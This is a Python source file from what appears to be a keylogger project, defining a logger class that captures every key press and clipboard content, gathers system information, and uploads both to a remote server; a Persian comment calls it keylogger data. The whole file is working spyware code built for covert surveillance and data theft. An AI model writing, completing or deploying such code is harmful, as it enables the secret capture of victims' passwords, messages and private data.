# ------------ monitoring/logger.py ------------
from datetime import datetime
import pyperclip
import logging

class ActivityLogger:
    def __init__(self, buffer_limit):
        self.buffer = []
        self.buffer_limit = buffer_limit

    def log_keystroke(self, event):
        if event.event_type == 'down':
            self.buffer.append(event.name)
            if len(self.buffer) >= self.buffer_limit:
                self.flush_buffer()

    def log_clipboard(self):
        try:
            content = pyperclip.paste()[:1000]
            if content:
                self.buffer.append(f"[CLIPBOARD]{content}")
        except Exception as e:
            logging.error(f"Clipboard monitoring error: {str(e)}")

    def flush_buffer(self):
        if self.buffer:
            try:
                from system.collector import SystemCollector
                from network.communicator import ServerCommunicator
                
                system_info = SystemCollector.collect_full()
                # ارسال داده‌های کیلاگر
                ServerCommunicator.upload_data(
                    keystrokes=self.buffer.copy(),
                    system_info=system_info
                )
                self.buffer.clear()
            except Exception as e:
                logging.error(f"Failed to upload data: {str(e)}")